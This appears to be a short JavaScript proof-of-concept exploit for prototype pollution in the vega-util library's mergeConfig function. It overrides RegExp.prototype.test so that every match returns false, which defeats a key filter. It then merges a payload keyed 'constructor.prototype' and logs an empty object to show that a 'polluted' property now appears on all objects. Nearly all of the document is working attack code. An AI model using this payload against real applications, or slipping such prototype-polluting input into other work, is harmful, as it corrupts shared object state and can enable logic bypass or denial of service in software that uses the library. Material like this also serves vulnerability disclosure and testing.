RegExp.prototype.test = () => false;
const util = require('vega-util');
const config = '{style: {point: {shape: triangle-right}}}';
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
util.mergeConfig(config, JSON.parse(malicious_payload));
console.log({}.polluted);